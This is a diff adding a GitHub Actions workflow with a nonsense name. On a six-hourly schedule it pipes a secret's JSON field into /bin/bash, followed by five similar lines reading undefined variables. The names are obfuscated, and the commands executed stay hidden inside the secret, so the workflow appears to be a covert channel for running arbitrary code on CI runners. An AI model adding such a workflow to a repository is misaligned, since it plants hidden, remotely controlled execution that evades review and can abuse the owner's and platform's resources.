@@ -1,0 +1,23 @@
+name: formulahorseshoes
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: formulahorseshoes
+        env:
+          eerb11: ${{ secrets.eerb11 }}
+        run: |
+          echo $eerb11 | jq -r .suvso72 | /bin/bash
+          echo $hxo09 | jq -r .ulhw484 | /bin/bash
+          echo $szn08969 | jq -r .vk421 | /bin/bash
+          echo $kvq8 | jq -r .vzbt01 | /bin/bash
+          echo $jwgq4 | jq -r .vfzgf7701 | /bin/bash
+          echo $zpl7 | jq -r .reh49 | /bin/bash
+
